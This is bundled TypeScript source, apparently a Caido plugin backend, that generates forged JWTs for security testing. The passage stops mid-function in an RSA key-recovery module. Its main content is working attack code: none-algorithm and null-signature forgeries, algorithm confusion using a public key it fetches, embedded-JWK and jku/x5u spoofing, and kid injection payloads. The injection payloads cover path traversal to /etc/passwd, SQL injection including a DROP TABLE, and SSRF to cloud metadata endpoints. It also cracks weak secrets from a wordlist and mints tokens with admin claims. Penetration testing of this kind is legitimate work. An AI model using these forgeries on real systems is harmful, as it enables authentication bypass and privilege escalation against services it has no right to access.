// packages/backend/src/index.ts
import { RequestSpec } from "caido:utils";

// packages/backend/src/crypto/jwt.ts
import { createHmac, createSign } from "node:crypto";
function b64urlEncode(data) {
  const bytes = typeof data === "string" ? Buffer.from(data, "utf8") : Buffer.from(data);
  return bytes.toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}
function b64urlDecode(str) {
  const padded = str + "=".repeat((4 - str.length % 4) % 4);
  return Buffer.from(padded.replace(/-/g, "+").replace(/_/g, "/"), "base64");
}
function parseJWT(token) {
  const parts = token.split(".");
  if (parts.length < 2) throw new Error("Invalid JWT: must have at least 2 parts");
  const [headerB64, payloadB64, signatureB64 = ""] = parts;
  let header;
  let payload;
  try {
    header = JSON.parse(b64urlDecode(headerB64).toString("utf8"));
  } catch {
    throw new Error("Invalid JWT: malformed header");
  }
  try {
    payload = JSON.parse(b64urlDecode(payloadB64).toString("utf8"));
  } catch {
    throw new Error("Invalid JWT: malformed payload");
  }
  return { headerB64, payloadB64, signatureB64, header, payload };
}
function encodeUnsigned(header, payload) {
  return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}`;
}
function buildJWT(header, payload, signature) {
  return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}.${signature}`;
}
function signHMAC(header, payload, secret, alg) {
  const hashMap = { HS256: "sha256", HS384: "sha384", HS512: "sha512" };
  const signingInput = encodeUnsigned(header, payload);
  const hmac = createHmac(hashMap[alg], secret);
  hmac.update(signingInput);
  const sig = b64urlEncode(hmac.digest());
  return `${signingInput}.${sig}`;
}
function signRSA(header, payload, privateKeyPem, alg) {
  const hashMap = {
    RS256: "SHA256",
    RS384: "SHA384",
    RS512: "SHA512",
    PS256: "SHA256",
    PS384: "SHA384",
    PS512: "SHA512"
  };
  const padding = alg.startsWith("PS") ? "RSA-PSS" : void 0;
  const signingInput = encodeUnsigned(header, payload);
  const signer = createSign(hashMap[alg]);
  signer.update(signingInput);
  const sig = padding ? signer.sign({ key: privateKeyPem, padding: 6, saltLength: -2 }) : signer.sign(privateKeyPem);
  return `${signingInput}.${b64urlEncode(sig)}`;
}
function signECDSA(header, payload, privateKeyPem, alg) {
  const hashMap = { ES256: "SHA256", ES384: "SHA384", ES512: "SHA512" };
  const signingInput = encodeUnsigned(header, payload);
  const signer = createSign(hashMap[alg]);
  signer.update(signingInput);
  const derSig = signer.sign(privateKeyPem);
  const rawSig = derToRawECDSA(derSig, alg);
  return `${signingInput}.${b64urlEncode(rawSig)}`;
}
function derToRawECDSA(der, alg) {
  const componentLen = { ES256: 32, ES384: 48, ES512: 66 }[alg];
  let offset = 2;
  if (der[1] === 129) offset = 3;
  else if (der[1] === 130) offset = 4;
  offset++;
  const rLen = der[offset++];
  let rStart = offset;
  if (der[rStart] === 0) {
    rStart++;
  }
  const r = der.slice(rStart, offset + rLen);
  offset += rLen;
  offset++;
  const sLen = der[offset++];
  let sStart = offset;
  if (der[sStart] === 0) {
    sStart++;
  }
  const s = der.slice(sStart, offset + sLen);
  const result = Buffer.alloc(componentLen * 2, 0);
  r.copy(result, componentLen - r.length);
  s.copy(result, componentLen * 2 - s.length);
  return result;
}
function verifyHMAC(token, secret, alg) {
  const parts = token.split(".");
  if (parts.length !== 3) return false;
  const hashMap = { HS256: "sha256", HS384: "sha384", HS512: "sha512" };
  const signingInput = `${parts[0]}.${parts[1]}`;
  const hmac = createHmac(hashMap[alg], secret);
  hmac.update(signingInput);
  const expected = b64urlEncode(hmac.digest());
  return expected === parts[2];
}
function getAlgorithmFamily(alg) {
  if (alg.toLowerCase() === "none") return "none";
  if (alg.startsWith("HS")) return "HS";
  if (alg.startsWith("RS")) return "RS";
  if (alg.startsWith("ES")) return "ES";
  if (alg.startsWith("PS")) return "PS";
  return "unknown";
}

// packages/backend/src/util.ts
import { randomBytes } from "node:crypto";
function nanoid(size = 12) {
  return randomBytes(size).toString("base64url").slice(0, size);
}
function parseCookies(cookieHeader) {
  const cookies = {};
  for (const pair of cookieHeader.split(";")) {
    const idx = pair.indexOf("=");
    if (idx === -1) continue;
    const key = pair.slice(0, idx).trim();
    const value = pair.slice(idx + 1).trim();
    cookies[key] = decodeURIComponent(value);
  }
  return cookies;
}
var JWT_REGEX = /^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*$/;
function looksLikeJWT(value) {
  const trimmed = value.trim();
  if (!JWT_REGEX.test(trimmed)) return false;
  try {
    const parts = trimmed.split(".");
    const header = JSON.parse(Buffer.from(
      parts[0] + "=".repeat((4 - parts[0].length % 4) % 4),
      "base64"
    ).toString("utf8"));
    return typeof header.alg === "string";
  } catch {
    return false;
  }
}

// packages/backend/src/attacks/none.ts
var NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe", "nONE", "NonE"];
function buildNoneAttacks(parsed) {
  const results = [];
  for (const alg of NONE_VARIANTS) {
    const header = { ...parsed.header, alg };
    results.push({
      id: nanoid(),
      technique: "none",
      techniqueName: `None Algorithm (alg="${alg}")`,
      description: `CVE-2015-9235: Sets alg to "${alg}" and strips the signature. Vulnerable servers accept unsigned tokens if they do not enforce signature presence.`,
      modifiedJWT: buildJWT(header, parsed.payload, ""),
      timestamp: Date.now()
    });
  }
  return results;
}

// packages/backend/src/attacks/nullSig.ts
function buildNullSigAttacks(parsed) {
  const signingInput = encodeUnsigned(parsed.header, parsed.payload);
  return [
    {
      id: nanoid(),
      technique: "nullSig",
      techniqueName: "Null Signature",
      description: "CVE-2020-28042: Retains the original algorithm but empties the signature. Vulnerable implementations skip signature verification when the signature field is empty.",
      modifiedJWT: `${signingInput}.`,
      timestamp: Date.now()
    }
  ];
}

// packages/backend/src/crypto/rsa.ts
import { generateKeyPairSync, createPublicKey } from "node:crypto";
function generateRSAKeyPair(bits = 2048) {
  const { publicKey, privateKey } = generateKeyPairSync("rsa", {
    modulusLength: bits,
    publicKeyEncoding: { type: "spki", format: "pem" },
    privateKeyEncoding: { type: "pkcs8", format: "pem" }
  });
  const jwk = publicKey2jwk(publicKey);
  return { publicKeyPem: publicKey, privateKeyPem: privateKey, publicJwk: jwk };
}
function publicKey2jwk(keyPem) {
  const key = createPublicKey(keyPem);
  const raw = key.export({ format: "jwk" });
  return raw;
}
function x509CertToPublicKeyPem(certPem) {
  try {
    const key = createPublicKey(certPem);
    return key.export({ type: "spki", format: "pem" });
  } catch {
    throw new Error("Failed to extract public key from certificate");
  }
}
function publicKeyPemToRawBytes(keyPem) {
  const key = createPublicKey(keyPem);
  return key.export({ type: "spki", format: "der" });
}
function jwkToPublicKeyPem(jwk) {
  const key = createPublicKey({ key: jwk, format: "jwk" });
  return key.export({ type: "spki", format: "pem" });
}
function jwksToPublicKeys(jwks) {
  const pems = [];
  for (const jwk of jwks.keys) {
    try {
      pems.push(jwkToPublicKeyPem(jwk));
    } catch {
    }
  }
  return pems;
}
function buildJWKSDocument(publicJwk, kid = "jwt-attacker-key") {
  return {
    keys: [
      {
        ...publicJwk,
        use: "sig",
        kid,
        alg: "RS256"
      }
    ]
  };
}

// packages/backend/src/crypto/ecdsa.ts
import { generateKeyPairSync as generateKeyPairSync2, createPublicKey as createPublicKey2 } from "node:crypto";
var ALG_TO_CURVE = {
  ES256: "prime256v1",
  ES384: "secp384r1",
  ES512: "secp521r1"
};
function generateECKeyPair(alg) {
  const curve = ALG_TO_CURVE[alg];
  const { publicKey, privateKey } = generateKeyPairSync2("ec", {
    namedCurve: curve,
    publicKeyEncoding: { type: "spki", format: "pem" },
    privateKeyEncoding: { type: "pkcs8", format: "pem" }
  });
  const key = createPublicKey2(publicKey);
  const jwk = key.export({ format: "jwk" });
  return { publicKeyPem: publicKey, privateKeyPem: privateKey, publicJwk: jwk, curve };
}
function ecPublicKeyPemToRawBytes(keyPem) {
  const key = createPublicKey2(keyPem);
  return key.export({ type: "spki", format: "der" });
}
function buildECJWKS(publicJwk, alg, kid = "jwt-attacker-ec-key") {
  return {
    keys: [{ ...publicJwk, use: "sig", kid, alg }]
  };
}

// packages/backend/src/crypto/certFetch.ts
import * as tls from "node:tls";
import * as https from "node:https";
import * as http from "node:http";
import { URL } from "node:url";

// packages/backend/src/types.ts
var COMMON_JWKS_PATHS = [
  "/.well-known/jwks.json",
  "/.well-known/openid-configuration",
  "/jwks.json",
  "/jwks",
  "/.well-known/keys",
  "/api/auth/keys",
  "/api/auth/jwks",
  "/oauth/jwks",
  "/oauth/v2/keys",
  "/v2/keys",
  "/auth/keys",
  "/auth/jwks",
  "/.well-known/jwt-keys",
  "/api/v1/jwks.json",
  "/realms/master/protocol/openid-connect/certs",
  "/connect/jwks_uri"
];

// packages/backend/src/crypto/certFetch.ts
async function fetchTLSCertPem(host, port = 443) {
  return new Promise((resolve, reject) => {
    const socket = tls.connect(
      { host, port, rejectUnauthorized: false, servername: host },
      () => {
        const cert = socket.getPeerX509Certificate();
        socket.destroy();
        if (!cert) {
          reject(new Error("No certificate returned"));
          return;
        }
        const b64 = cert.raw.toString("base64");
        const lines = b64.match(/.{1,64}/g).join("\n");
        resolve(`-----BEGIN CERTIFICATE-----
${lines}
-----END CERTIFICATE-----
`);
      }
    );
    socket.on("error", reject);
    socket.setTimeout(8e3, () => {
      socket.destroy();
      reject(new Error("TLS connection timeout"));
    });
  });
}
async function fetchURL(url, timeoutMs = 8e3) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const lib = parsed.protocol === "https:" ? https : http;
    const req = lib.get(
      url,
      { rejectUnauthorized: false, headers: { "User-Agent": "Mozilla/5.0" } },
      (res) => {
        let data = "";
        res.on("data", (chunk) => {
          data += chunk.toString();
        });
        res.on("end", () => resolve(data));
      }
    );
    req.on("error", reject);
    req.setTimeout(timeoutMs, () => {
      req.destroy();
      reject(new Error(`Timeout fetching ${url}`));
    });
  });
}
async function fetchJWKS(url) {
  try {
    const body = await fetchURL(url);
    const parsed = JSON.parse(body);
    if (Array.isArray(parsed.keys)) return parsed;
    return null;
  } catch {
    return null;
  }
}
async function fetchOpenIDConfig(issuerUrl) {
  try {
    const configUrl = `${issuerUrl.replace(/\/$/, "")}/.well-known/openid-configuration`;
    const body = await fetchURL(configUrl);
    const config = JSON.parse(body);
    return config.jwks_uri ?? null;
  } catch {
    return null;
  }
}
async function discoverJWKS(baseUrl, extraPaths = []) {
  const parsed = new URL(baseUrl);
  const origin = `${parsed.protocol}//${parsed.host}`;
  const pathsToTry = [...COMMON_JWKS_PATHS, ...extraPaths];
  const results = [];
  const jwksUri = await fetchOpenIDConfig(origin);
  if (jwksUri) {
    const jwks = await fetchJWKS(jwksUri);
    if (jwks) results.push({ url: jwksUri, keys: jwks.keys });
  }
  for (let i = 0; i < pathsToTry.length; i += 5) {
    const batch = pathsToTry.slice(i, i + 5);
    const settled = await Promise.allSettled(
      batch.map(async (path) => {
        const url = `${origin}${path}`;
        const jwks = await fetchJWKS(url);
        if (jwks && jwks.keys.length > 0) return { url, keys: jwks.keys };
        return null;
      })
    );
    for (const r of settled) {
      if (r.status === "fulfilled" && r.value) results.push(r.value);
    }
  }
  return results;
}

// packages/backend/src/attacks/algConfusion.ts
var ALG_CONFUSION_MAP = {
  RS256: "HS256",
  RS384: "HS384",
  RS512: "HS512",
  PS256: "HS256",
  PS384: "HS384",
  PS512: "HS512",
  ES256: "HS256",
  ES384: "HS384",
  ES512: "HS512"
};
function isAsymmetricAlg(alg) {
  return alg.startsWith("RS") || alg.startsWith("PS") || alg.startsWith("ES");
}
function publicKeyPemToSecret(keyPem, originalAlg) {
  if (originalAlg.startsWith("ES")) {
    return ecPublicKeyPemToRawBytes(keyPem);
  }
  return publicKeyPemToRawBytes(keyPem);
}
function makeAttack(parsed, hmacAlg, publicKeyPem, sourceDesc) {
  const header = { ...parsed.header, alg: hmacAlg };
  delete header.jku;
  delete header.jwk;
  delete header.x5u;
  delete header.x5c;
  delete header.kid;
  const secret = publicKeyPemToSecret(publicKeyPem, parsed.header.alg);
  const jwt = signHMAC(header, parsed.payload, secret, hmacAlg);
  return {
    id: nanoid(),
    technique: "algConfusion",
    techniqueName: `Algorithm Confusion (${parsed.header.alg} \u2192 ${hmacAlg}, ${sourceDesc})`,
    description: `CVE-2016-5431: Re-signs the token as ${hmacAlg} using the server's RSA/EC public key (${sourceDesc}) as the HMAC secret. Vulnerable servers using the same key object for both RS/ES and HS verification will accept this token.`,
    modifiedJWT: jwt,
    timestamp: Date.now()
  };
}
async function buildAlgConfusionAttacks(parsed, requestHost, requestPort, requestTls, config, recoveredKeys = []) {
  const originalAlg = parsed.header.alg;
  if (!isAsymmetricAlg(originalAlg)) return [];
  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
  const results = [];
  const addKey = (pem, source) => {
    try {
      results.push(makeAttack(parsed, hmacAlg, pem, source));
    } catch {
    }
  };
  if (config.customPublicKeyPem) {
    addKey(config.customPublicKeyPem, "configured public key");
  }
  if (config.customCertPem) {
    try {
      const pem = x509CertToPublicKeyPem(config.customCertPem);
      addKey(pem, "configured certificate");
    } catch {
    }
  }
  if (requestTls || requestPort === 443) {
    try {
      const certPem = await fetchTLSCertPem(requestHost, requestPort);
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "TLS certificate");
    } catch {
    }
  }
  if (parsed.header.jku) {
    try {
      const jwks = await fetchJWKS(parsed.header.jku);
      if (jwks) {
        for (const pem of jwksToPublicKeys(jwks)) {
          addKey(pem, `jku (${parsed.header.jku})`);
        }
      }
    } catch {
    }
  }
  if (parsed.header.x5c && Array.isArray(parsed.header.x5c) && parsed.header.x5c.length > 0) {
    try {
      const certDer = Buffer.from(parsed.header.x5c[0], "base64");
      const certPem = `-----BEGIN CERTIFICATE-----
${certDer.toString("base64").match(/.{1,64}/g).join("\n")}
-----END CERTIFICATE-----
`;
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "embedded x5c cert");
    } catch {
    }
  }
  const proto = requestTls ? "https" : "http";
  const port = requestTls && requestPort === 443 || !requestTls && requestPort === 80 ? "" : `:${requestPort}`;
  const baseUrl = `${proto}://${requestHost}${port}`;
  try {
    const discovered = await discoverJWKS(baseUrl, config.extraJwksPaths);
    for (const result of discovered) {
      for (const pem of jwksToPublicKeys({ keys: result.keys })) {
        addKey(pem, `JWKS (${result.url})`);
      }
    }
  } catch {
  }
  for (const pem of recoveredKeys) {
    addKey(pem, "recovered from HTTP history");
  }
  return results;
}

// packages/backend/src/attacks/embeddedJwk.ts
function buildEmbeddedJWKAttacks(parsed) {
  const alg = parsed.header.alg;
  const results = [];
  const attempt = (genFn, targetAlg, signFn) => {
    try {
      const { publicJwk, privateKeyPem } = genFn();
      const header = {
        ...parsed.header,
        alg: targetAlg,
        jwk: publicJwk,
        // Remove fields that could conflict
        jku: void 0,
        x5u: void 0,
        x5c: void 0,
        kid: void 0
      };
      const jwt = signFn(header, parsed.payload, privateKeyPem, targetAlg);
      results.push({
        id: nanoid(),
        technique: "embeddedJwk",
        techniqueName: `Embedded JWK (${targetAlg})`,
        description: 'CVE-2018-0114: Generates a fresh key pair and embeds the public key in the JWT header as a "jwk" parameter, then re-signs with the corresponding private key. Vulnerable servers that use the embedded jwk field for verification will accept this.',
        modifiedJWT: jwt,
        timestamp: Date.now()
      });
    } catch {
    }
  };
  attempt(
    () => generateRSAKeyPair(2048),
    "RS256",
    (h, p, k, a) => signRSA(h, p, k, a)
  );
  if (alg.startsWith("ES") || alg.startsWith("RS") || alg.startsWith("PS")) {
    const ecAlg = alg.startsWith("ES") ? alg : "ES256";
    attempt(
      () => generateECKeyPair(ecAlg),
      ecAlg,
      (h, p, k, a) => signECDSA(h, p, k, a)
    );
  }
  return results;
}

// packages/backend/src/attacks/jkuSpoof.ts
function buildJKUSpoofAttacks(parsed, config) {
  const alg = parsed.header.alg;
  const results = [];
  let jwksContent = null;
  let jwksKey = null;
  if (!config.jwksUrl) {
    return { attacks: [], jwksContent: null, jwksKey: null };
  }
  const targetAlg = alg.startsWith("ES") ? alg : "RS256";
  const kid = "jwt-attacker-spoof-key";
  let publicJwk;
  let privateKeyPem;
  let jwks;
  if (targetAlg.startsWith("ES")) {
    const ecAlg = targetAlg;
    if (config.customPrivateKeyPem) {
      privateKeyPem = config.customPrivateKeyPem;
      const kp = generateECKeyPair(ecAlg);
      publicJwk = kp.publicJwk;
    } else {
      const kp = generateECKeyPair(ecAlg);
      publicJwk = kp.publicJwk;
      privateKeyPem = kp.privateKeyPem;
    }
    jwks = buildECJWKS(publicJwk, ecAlg, kid);
  } else {
    if (config.customPrivateKeyPem) {
      privateKeyPem = config.customPrivateKeyPem;
      const kp = generateRSAKeyPair(2048);
      publicJwk = kp.publicJwk;
    } else {
      const kp = generateRSAKeyPair(2048);
      publicJwk = kp.publicJwk;
      privateKeyPem = kp.privateKeyPem;
    }
    jwks = buildJWKSDocument(publicJwk, kid);
  }
  jwksContent = JSON.stringify(jwks, null, 2);
  jwksKey = privateKeyPem;
  try {
    const headerJku = {
      ...parsed.header,
      alg: targetAlg,
      jku: config.jwksUrl,
      kid,
      jwk: void 0,
      x5u: void 0,
      x5c: void 0
    };
    const jwt = targetAlg.startsWith("ES") ? signECDSA(headerJku, parsed.payload, privateKeyPem, targetAlg) : signRSA(headerJku, parsed.payload, privateKeyPem, "RS256");
    results.push({
      id: nanoid(),
      technique: "jkuSpoof",
      techniqueName: `JKU Spoofing (${targetAlg})`,
      description: `Sets the jku header to ${config.jwksUrl} and signs with a fresh private key. The server must be able to reach your JWKS endpoint. Host the generated JWKS JSON at that URL before sending this request.`,
      modifiedJWT: jwt,
      timestamp: Date.now()
    });
  } catch {
  }
  try {
    const headerX5u = {
      ...parsed.header,
      alg: targetAlg,
      x5u: config.jwksUrl,
      // same URL — user can host a cert chain there too
      kid,
      jwk: void 0,
      jku: void 0,
      x5c: void 0
    };
    const jwt = targetAlg.startsWith("ES") ? signECDSA(headerX5u, parsed.payload, privateKeyPem, targetAlg) : signRSA(headerX5u, parsed.payload, privateKeyPem, "RS256");
    results.push({
      id: nanoid(),
      technique: "x5uSpoof",
      techniqueName: `X5U Spoofing (${targetAlg})`,
      description: `Sets the x5u header to ${config.jwksUrl} and signs with a fresh private key. Host the generated JWKS / certificate chain at that URL.`,
      modifiedJWT: jwt,
      timestamp: Date.now()
    });
  } catch {
  }
  return { attacks: results, jwksContent, jwksKey };
}

// packages/backend/src/attacks/kidInject.ts
var PATH_TRAVERSAL_KIDS = [
  {
    kid: "../../../../dev/null",
    secret: Buffer.from(""),
    description: "Path traversal to /dev/null (empty secret)"
  },
  {
    kid: "../../../../../../dev/null",
    secret: Buffer.from(""),
    description: "Deeper path traversal to /dev/null (empty secret)"
  },
  {
    kid: "/dev/null",
    secret: Buffer.from(""),
    description: "Absolute path /dev/null (empty secret)"
  },
  {
    kid: "../../../../proc/sys/kernel/randomize_va_space",
    secret: Buffer.from("2"),
    description: "Path traversal to Linux kernel file (typical content: '2')"
  },
  {
    kid: "../../../../etc/passwd",
    secret: Buffer.from(""),
    description: "Path traversal to /etc/passwd"
  },
  {
    kid: "../../../../windows/win.ini",
    secret: Buffer.from(""),
    description: "Path traversal to Windows win.ini"
  }
];
var SQL_INJECTION_KIDS = [
  {
    kid: "' UNION SELECT 'secret'-- -",
    secret: Buffer.from("secret"),
    description: "SQL UNION injection returning 'secret' as the key"
  },
  {
    kid: "' UNION SELECT 'a'-- -",
    secret: Buffer.from("a"),
    description: "SQL UNION injection returning 'a' as the key"
  },
  {
    kid: "' OR '1'='1",
    secret: Buffer.from(""),
    description: "SQL OR injection (tautology)"
  },
  {
    kid: "1 OR 1=1",
    secret: Buffer.from(""),
    description: "SQL numeric OR injection"
  },
  {
    kid: `" UNION SELECT 'secret'-- -`,
    secret: Buffer.from("secret"),
    description: "SQL UNION injection (double-quote variant)"
  },
  {
    kid: "; DROP TABLE users--",
    secret: Buffer.from(""),
    description: "SQL statement termination injection"
  }
];
var SSRF_KIDS = [
  {
    kid: "http://169.254.169.254/latest/meta-data/",
    secret: Buffer.from(""),
    description: "SSRF to AWS IMDSv1 metadata endpoint"
  },
  {
    kid: "http://metadata.google.internal/computeMetadata/v1/",
    secret: Buffer.from(""),
    description: "SSRF to GCP metadata endpoint"
  },
  {
    kid: "http://100.100.100.200/latest/meta-data/",
    secret: Buffer.from(""),
    description: "SSRF to Alibaba Cloud metadata endpoint"
  },
  {
    kid: "http://localhost/",
    secret: Buffer.from(""),
    description: "SSRF to localhost"
  }
];
var WEAK_KIDS = [
  {
    kid: "0",
    secret: Buffer.from("secret"),
    description: "Kid=0 with secret='secret'"
  },
  {
    kid: "1",
    secret: Buffer.from("secret"),
    description: "Kid=1 with secret='secret'"
  },
  {
    kid: "",
    secret: Buffer.from(""),
    description: "Empty kid with empty secret"
  }
];
function buildHSAttack(parsed, payload, category) {
  const alg = parsed.header.alg.startsWith("HS") ? parsed.header.alg : "HS256";
  const header = { ...parsed.header, alg, kid: payload.kid };
  const jwt = signHMAC(header, parsed.payload, payload.secret, alg);
  return {
    id: nanoid(),
    technique: "kidInject",
    techniqueName: `KID Injection \u2014 ${category}`,
    description: `Injects kid="${payload.kid}" \u2014 ${payload.description}`,
    modifiedJWT: jwt,
    timestamp: Date.now()
  };
}
function buildKIDInjectionAttacks(parsed) {
  const results = [];
  for (const payload of PATH_TRAVERSAL_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Path Traversal"));
  }
  for (const payload of SQL_INJECTION_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SQL Injection"));
  }
  for (const payload of SSRF_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SSRF"));
  }
  for (const payload of WEAK_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Weak KID"));
  }
  return results;
}

// packages/backend/src/attacks/claimTamper.ts
var ADMIN_FIELDS = {
  role: "admin",
  admin: true,
  is_admin: true,
  isAdmin: true,
  superuser: true,
  scope: "admin read write",
  permissions: ["admin", "read", "write"],
  group: "admin",
  groups: ["admin"],
  authorities: ["ROLE_ADMIN"]
};
var PRIVILEGE_ESCALATION_PAYLOADS = [
  { label: "Role=Admin", changes: { role: "admin" } },
  { label: "Admin=True", changes: { admin: true, is_admin: true } },
  { label: "Superuser+All Scope", changes: { superuser: true, scope: "openid profile email admin read write" } },
  { label: "Sub='admin'", changes: { sub: "admin" } },
  { label: "Sub='root'", changes: { sub: "root" } },
  { label: "Sub='administrator'", changes: { sub: "administrator" } },
  { label: "Full Admin Blast", changes: { ...ADMIN_FIELDS } }
];
var EXPIRY_MANIPULATIONS = [
  {
    label: "Expiry +10 years",
    mutate: (p) => {
      const now = Math.floor(Date.now() / 1e3);
      return {
        ...p,
        exp: now + 60 * 60 * 24 * 365 * 10,
        nbf: now - 60,
        iat: now
      };
    }
  },
  {
    label: "Remove expiry",
    mutate: (p) => {
      const out = { ...p };
      delete out.exp;
      return out;
    }
  }
];
function buildClaimTamperAttacks(parsed) {
  const results = [];
  for (const { label, changes } of PRIVILEGE_ESCALATION_PAYLOADS) {
    const payload = { ...parsed.payload, ...changes };
    results.push({
      id: nanoid(),
      technique: "claimTamper",
      techniqueName: `Claim Tamper \u2014 ${label}`,
      description: `Modifies payload claims (${label}) while preserving the original algorithm. The signature is invalid \u2014 surfaces servers that skip verification.`,
      modifiedJWT: buildJWT(parsed.header, payload, parsed.signatureB64),
      timestamp: Date.now()
    });
  }
  for (const { label, mutate } of EXPIRY_MANIPULATIONS) {
    const payload = mutate(parsed.payload);
    results.push({
      id: nanoid(),
      technique: "claimTamper",
      techniqueName: `Claim Tamper \u2014 ${label}`,
      description: `${label}: modifies temporal claims while preserving original algorithm and signature. Surfaces servers that do not validate expiry, or where expiry is checked separately from signature.`,
      modifiedJWT: buildJWT(parsed.header, payload, parsed.signatureB64),
      timestamp: Date.now()
    });
  }
  const stripped = { ...parsed.payload };
  for (const k of ["exp", "nbf", "iat", "jti", "iss", "aud"]) delete stripped[k];
  results.push({
    id: nanoid(),
    technique: "claimTamper",
    techniqueName: "Claim Tamper \u2014 Strip Security Claims",
    description: "Removes exp, nbf, iat, jti, iss, and aud claims with original signature. Tests whether the server enforces these validation steps independently.",
    modifiedJWT: buildJWT(parsed.header, stripped, parsed.signatureB64),
    timestamp: Date.now()
  });
  return results;
}

// packages/backend/src/wordlist.ts
var WEAK_JWT_SECRETS = [
  // Empty / trivial
  "",
  "secret",
  "Secret",
  "SECRET",
  // Common passwords
  "password",
  "Password",
  "PASSWORD",
  "password1",
  "Password1",
  "123456",
  "1234567890",
  "12345678",
  "123456789",
  "0123456789",
  "111111",
  "222222",
  "333333",
  "555555",
  "666666",
  "777777",
  "888888",
  "999999",
  "qwerty",
  "qwerty123",
  "abc123",
  "letmein",
  "letmein1",
  "monkey",
  "dragon",
  "master",
  "sunshine",
  "princess",
  "football",
  "baseball",
  "iloveyou",
  "trustno1",
  "abcdef",
  "abcdefghij",
  "1234abcd",
  "welcome",
  "Welcome1",
  "swordfish",
  "hello",
  "world",
  // JWT-specific
  "jwt-secret",
  "jwt_secret",
  "jwtSecret",
  "jwtSecret123",
  "jwt-key",
  "jwt_key",
  "jwtKey",
  "jwt-token",
  "auth-token",
  "authtoken",
  "your-secret-key",
  "your-256-bit-secret",
  "your-384-bit-secret",
  "your-512-bit-secret",
  "your-secret",
  "your_secret",
  "mysecret",
  "my_secret",
  "my-secret",
  "secretkey",
  "secret_key",
  "secret-key",
  "secretkey123",
  "supersecret",
  "super_secret",
  "super-secret",
  "shared-secret",
  "shared_secret",
  // Placeholder strings
  "change-this-to-a-secret",
  "please-change-me",
  "THIS_IS_NOT_SECURE",
  "NOT_SECURE",
  "CHANGEME",
  "CHANGE_ME",
  "changeme",
  "changeme!",
  "TODO_CHANGE_ME",
  "TODO",
  // Application/framework defaults
  "flask_secret",
  "django_secret",
  "rails_secret",
  "express_secret",
  "node_env_secret",
  "laravel_secret",
  "rails_secret_key_base",
  "SECRET_KEY",
  "AUTH_SECRET",
  "JWT_SECRET",
  "APP_SECRET",
  "ACCESS_TOKEN_SECRET",
  "REFRESH_TOKEN_SECRET",
  // Environment variable names (developers sometimes use these as values)
  "JWT_SECRET",
  "jwt_secret",
  "NODE_ENV",
  // Dev/test
  "test",
  "test123",
  "testing",
  "testing123",
  "test_secret",
  "dev",
  "development",
  "staging",
  "production",
  "prod",
  "local",
  "localhost",
  "debug",
  "DEBUG",
  // Common short words
  "default",
  "admin",
  "administrator",
  "root",
  "user",
  "demo",
  "sample",
  "example",
  "temp",
  "tmp",
  "key",
  "token",
  "session",
  "cookie",
  "login",
  "pepper",
  "salt",
  "hash",
  "app",
  "application",
  "service",
  "api",
  "backend",
  "null",
  "undefined",
  "none",
  "nil",
  "empty",
  // Keyboard walks
  "qazwsx",
  "zxcvbnm",
  "asdfghjkl",
  // Numeric
  "000000",
  "11111111",
  "00000000",
  // Mixed case variants
  "Admin",
  "ROOT",
  "User",
  "Demo",
  "Changeme",
  "Secret1",
  "P@ssw0rd",
  "P@ssword",
  "s3cr3t",
  "S3cr3t",
  "p4ssw0rd",
  "secr3t",
  // Potential env file leaks
  "super_secret_jwt_key",
  "your_jwt_secret_here",
  // Year-based
  "2020",
  "2021",
  "2022",
  "2023",
  "2024",
  "2025",
  "secret2023",
  "secret2024",
  "jwt2024",
  // UUID-looking but common
  "00000000-0000-0000-0000-000000000000",
  // International common passwords
  "wachtwoord",
  "motdepasse",
  "kennwort",
  // Security research community
  "kali",
  "pentest",
  "hacker",
  "hack",
  "exploit",
  "pwned"
];

// packages/backend/src/attacks/weakSecret.ts
async function buildWeakSecretAttacks(parsed, config, originalToken) {
  const alg = parsed.header.alg;
  if (!alg.startsWith("HS")) return [];
  const hmacAlg = alg;
  const wordlist = [...WEAK_JWT_SECRETS, ...config.customWordlist];
  const results = [];
  for (const word of wordlist) {
    const secret = Buffer.from(word, "utf8");
    if (!verifyHMAC(originalToken, secret, hmacAlg)) continue;
    const adminPayload = {
      ...parsed.payload,
      role: "admin",
      admin: true,
      is_admin: true,
      exp: Math.floor(Date.now() / 1e3) + 60 * 60 * 24 * 365
    };
    const adminJwt = signHMAC(parsed.header, adminPayload, secret, hmacAlg);
    const resignedJwt = signHMAC(parsed.header, parsed.payload, secret, hmacAlg);
    results.push({
      id: nanoid(),
      technique: "weakSecret",
      techniqueName: `Weak Secret Found: "${word}"`,
      description: `Cracked the ${hmacAlg} signing secret: "${word}". Provides re-signed token with elevated claims (admin=true, role=admin, +1yr exp).`,
      modifiedJWT: adminJwt,
      timestamp: Date.now()
    });
    results.push({
      id: nanoid(),
      technique: "weakSecret",
      techniqueName: `Weak Secret Re-sign (original claims): "${word}"`,
      description: `Re-signs the original token with secret "${word}" \u2014 no claim changes. Useful to verify the server accepts the cracked secret.`,
      modifiedJWT: resignedJwt,
      timestamp: Date.now()
    });
  }
  return results;
}

// packages/backend/src/crypto/keyRecovery.ts
import { createHash } from "node:crypto";
import { createPublicKey as createPublicKey3 } from "node:crypto";
var DIGEST_INFO = {
  sha256: Buffer.from("3031300d060960864801650304020105000420", "hex"),
  sha384: Buffer.from("3041300d060960864801650304020205000430", "hex"),
  sha512: Buffer.from("3051300d060960864801650304020305000440", "hex")
};
var ALG_TO_HASH = {
  RS256: "sha256",
  RS384: "sha384",
  RS512: "sha512"
};
function gcd(a, b) {
  while (b !== 0n) {
    [a, b] = [b, a % b];
  }
  return a < 0n ? -a : a;
}
function buildEM(hash, hashAlg, keyLen) {
  const di = DIGEST_INFO[hashAlg];
  if (!di) throw new Error(`No DigestInfo for ${hashAlg}`);
  const psLen = keyLen - 3 - di.length - hash.length;
  if (psLen < 8) throw new Error("Key too short for this hash algorithm");
